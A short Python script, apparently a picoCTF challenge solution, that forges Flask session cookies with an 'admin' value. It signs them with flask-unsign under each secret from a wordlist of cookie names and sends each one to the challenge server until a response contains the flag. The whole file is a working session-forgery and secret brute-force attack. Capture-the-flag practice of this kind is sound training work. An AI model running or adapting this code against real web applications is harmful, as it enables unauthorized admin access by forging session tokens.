import subprocess
import requests

def sign(secrets, cookie_data="{'very_auth': 'admin'}"):
    out = {}
    for s in secrets:
            r = subprocess.run(
                ['flask-unsign', '--sign', '--cookie', cookie_data, '--secret', s],
                capture_output=True, text=True, check=True
            )
            out[s] = r.stdout.strip()
        
    return out

def check(signed):
    url = 'http://mercury.picoctf.net:65344/display'
    for secret, cookie in signed.items():
        try:
            if not isinstance(cookie, str) or cookie.startswith("Error:"):
                continue
            resp = requests.get(url, cookies={'session': cookie}, allow_redirects=False, timeout=10)
            if resp.status_code in (301, 302, 303, 307, 308):
                continue
            if 'picoCTF' in resp.text:
                print(f"Secret: {secret}\nSigned Cookie: {cookie}\nResponse Text: {resp.text}\n")
                return True
        except Exception as e:
            print(f"Error with secret '{secret}': {e}")
    return False

if __name__ == "__main__":
    secrets = [
        "snickerdoodle","chocolate chip","oatmeal raisin","gingersnap","shortbread",
        "peanut butter","whoopie pie","sugar","molasses","kiss","biscotti","butter",
        "spritz","snowball","drop","thumbprint","pinwheel","wafer","macaroon",
        "fortune","crinkle","icebox","gingerbread","tassie","lebkuchen","macaron",
        "black and white","white chocolate macadamia"
    ]
    signed = sign(secrets)
    check(signed)
